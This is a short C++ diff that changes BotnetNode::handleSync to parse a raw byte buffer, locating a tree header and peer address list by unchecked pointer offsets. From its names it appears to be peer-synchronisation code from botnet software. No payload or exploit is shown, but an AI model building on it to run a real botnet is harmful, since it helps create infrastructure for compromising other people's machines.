@@ -96,7 +96,7 @@ BotnetNode* BotnetNode::findNode(
 }
 
 void BotnetNode::handleSync(
-	const struct botnet_pack& pack
+	const u_char* pack
 )
 {
 	/* locals */
@@ -105,8 +105,8 @@ void BotnetNode::handleSync(
 	tree_ext* base; 
 	adr* peer; 
 
-	base = (tree_ext*)((u_char*)&pack + BOTNET_PACK_SIZE);
-	peer = (adr*)((u_char*)base + sizeof(tree_ext));
+	base = (tree_ext*)(pack + BOTNET_PACK_SIZE);
+	peer = (adr*)(pack + BOTNET_PACK_SIZE + sizeof(tree_ext));
 
 	/* add all host's sub peers to a list */
 	peers_nodes.clear();
